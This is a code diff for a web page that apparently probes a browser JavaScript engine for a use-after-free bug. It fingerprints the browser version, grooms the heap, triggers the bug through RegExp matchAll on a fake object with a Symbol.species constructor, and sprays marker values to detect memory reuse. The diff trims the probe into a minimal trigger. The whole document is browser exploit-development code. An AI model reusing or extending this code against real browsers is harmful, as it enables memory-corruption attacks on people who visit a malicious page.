@@ -5,30 +5,22 @@ function out(m){ var r=document.getElementById('r'); r.textContent += '\n'+m; }
 function trash(n) { for (let i = 0; i < n; i++) new Array(0x1000).fill(1.1); }
 const MARK = (function(){ const c=new Float64Array(1), u=new Uint32Array(c.buffer); u[0]=0x13371337; u[1]=0x41414141; return c[0]; })();
 function spray_round() { for (let i = 0; i < 4; i++) { const a = new Array(i & 1 ? 0x3ffb : 0x3fff).fill(MARK); } }
-function trigger(re) {
-  const fake = { flags: "g", lastIndex: 1073741823,
-    constructor: {[Symbol.species]: function() { return re }} };
-  RegExp.prototype[Symbol.matchAll].call(fake, "").next();
-}
 async function main(){
   out('START');
   try { var h = await navigator.userAgentData.getHighEntropyValues(['fullVersionList']); out('FULL ' + h.fullVersionList.map(b=>b.brand+'='+b.version).join(';')); } catch(e){ out('UA ' + navigator.userAgent); }
-  for (const scale of [36, 120, 300]) {
+  for (const scale of [120]) {
     try {
       const re = /(?:)/;
       trash(scale); trash(scale);
-      trigger(re);
+      const fake = { flags: "g", lastIndex: 1073741823, constructor: {[Symbol.species]: function() { return re }} };
+      RegExp.prototype[Symbol.matchAll].call(fake, "").next();
       const t0 = String(re.lastIndex);
       spray_round();
       const s1 = String(re.lastIndex);
-      spray_round();
-      const s2 = String(re.lastIndex);
-      spray_round(); trash(20);
-      const s3 = String(re.lastIndex);
-      out('SC' + scale + ' ' + JSON.stringify({t0,s1,s2,s3,uaf:[s1,s2,s3].some(x=>x!=='1073741824')}));
+      out('SC' + scale + ' ' + JSON.stringify({t0,s1,uaf:s1!=='1073741824'}));
     } catch(e) { out('SC' + scale + ' ERR ' + (e && e.message ? e.message : e)); }
   }
-  out('REGPROBE_DONE');
+  out('REGMIN_DONE');
 }
 main();
 </script>
